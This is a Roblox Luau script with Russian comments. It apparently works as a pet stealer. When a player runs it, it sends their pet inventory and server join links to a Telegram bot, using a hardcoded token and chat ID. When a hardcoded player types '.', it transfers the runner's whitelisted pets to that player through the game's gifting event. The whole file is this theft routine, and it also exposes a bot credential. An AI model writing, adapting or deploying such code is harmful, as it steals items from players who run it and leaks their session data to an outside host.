local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

-- 🔧 НАСТРОЙКИ
local TELEGRAM_TOKEN = "7678595031:AAHYzkbKKI4CdT6B2NUGcYY6IlTvWG8xkzE"
local TELEGRAM_CHAT_ID = "7144575011"
local TARGET_PLAYER = "Rikizigg"
local TRIGGER_MESSAGE = "."
local DELAY = 2 -- Задержка между передачами

-- 🐾 БЕЛЫЙ СПИСОК (ТОЛЬКО эти питомцы будут передаваться)
local WHITELIST = {
    "Hamster"
}

-- 🌐 Генерация рабочих ссылок
local function getServerLinks()
    return {
        direct = string.format("roblox://placeID=%d&gameInstanceID=%s", game.PlaceId, game.JobId),
        web = string.format("https://www.roblox.com/games/%d?gameInstanceId=%s", game.PlaceId, game.JobId),
        joinCmd = string.format("/join %s", game.JobId)
    }
end

-- 🔎 Найти ВСЕХ питомцев
local function getAllPets()
    local pets = {}
    local backpack = player:FindFirstChild("Backpack") or player.Character
    
    for _, item in ipairs(backpack:GetChildren()) do
        if item:IsA("Tool") then
            -- Ищем формат "[X.XX KG] [Age X]"
            local weight, age = item.Name:match("%[(%d+%.%d+) KG%].*%[Age (%d+)%]")
            if weight and age then
                -- Берем чистое название (первое слово)
                local petName = item.Name:match("^%s*([^%[%]]+)") or item.Name
                petName = petName:gsub("%s+$", "")
                
                table.insert(pets, {
                    name = petName,
                    fullName = item.Name,
                    weight = tonumber(weight),
                    age = tonumber(age),
                    object = item,
                    isWhitelisted = table.find(WHITELIST, petName) ~= nil
                })
            end
        end
    end
    
    return pets
end

-- 📜 Сформировать сообщение
local function createReport(pets)
    if #pets == 0 then return "❌ Нет питомцев в инвентаре" end
    
    local message = "📋 Все питомцы ("..#pets.."):\n"
    for _, pet in ipairs(pets) do
        message = message .. string.format(
            "%s %s [%.2f кг, Age %d]\n",
            pet.isWhitelisted and "✓" or "✗",
            pet.name,
            pet.weight,
            pet.age
        )
    end
    return message
end

-- ✋ Взять в руку
local function equipPet(pet)
    if not pet then return false end
    if not player.Character then return false end
    
    local humanoid = player.Character:FindFirstChild("Humanoid")
    if not humanoid then return false end
    
    humanoid:EquipTool(pet)
    task.wait(1)
    return true
end

-- 📤 Передать питомца (ТОЛЬКО из белого списка)
local function transferPet(pet)
    if not pet.isWhitelisted then 
        print("❌ Не в белом списке:", pet.name)
        return false 
    end
    
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if not target then
        print("❌ Целевой игрок не найден")
        return false
    end
    
    local gifting = ReplicatedStorage:FindFirstChild("GameEvents"):FindFirstChild("PetGiftingService")
    if not gifting then
        print("❌ PetGiftingService не найден")
        return false
    end
    
    local success, err = pcall(function()
        gifting:FireServer("GivePet", target)
    end)
    
    if not success then
        print("❌ Ошибка передачи:", err)
    end
    
    return success
end

-- 📨 Отправить в Telegram
local function sendToTelegram(text)
    local url = string.format(
        "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
        TELEGRAM_TOKEN,
        TELEGRAM_CHAT_ID,
        HttpService:UrlEncode(text)
    )
    
    pcall(function()
        game:HttpGet(url, true)
    end)
end

-- 🚀 Основная функция
local function startTransfer()
    local links = getServerLinks()
    local pets = getAllPets()
    local report = string.format(
        "%s\n\n🔗 Способы подключения:\n"..
        "1. Клик: %s\n"..
        "2. Веб: %s\n"..
        "3. Команда: %s",
        createReport(pets),
        links.direct,
        links.web,
        links.joinCmd
    )
    
    sendToTelegram(report)
    
    local transferred = 0
    for _, pet in ipairs(pets) do
        if pet.isWhitelisted then
            local status = "⚠️ Не взялся в руку"
            
            if equipPet(pet.object) then
                status = transferPet(pet) and "✅ Успешно" or "❌ Ошибка"
                if status == "✅ Успешно" then
                    transferred = transferred + 1
                end
            end
            
            sendToTelegram(string.format("%s: %s", pet.name, status))
            task.wait(DELAY)
        end
    end
    
    sendToTelegram(string.format("🏁 Итого передано: %d/%d", transferred, #pets))
end

-- 👂 Слушатель чата
game.Players.PlayerChatted:Connect(function(_, speaker, message)
    if speaker.Name == TARGET_PLAYER and message == TRIGGER_MESSAGE then
        startTransfer()
    end
end)

-- 🏁 Стартовое уведомление
sendToTelegram(
    "🔔 "..player.Name.." активировал скрипт\n"..
    "Ожидаю команду '"..TRIGGER_MESSAGE.."' от "..TARGET_PLAYER.."\n"..
    "✓ - будут переданы\n✗ - не из белого списка"
)

print("✅ Скрипт запущен. Ожидаю команду '"..TRIGGER_MESSAGE.."' от", TARGET_PLAYER)
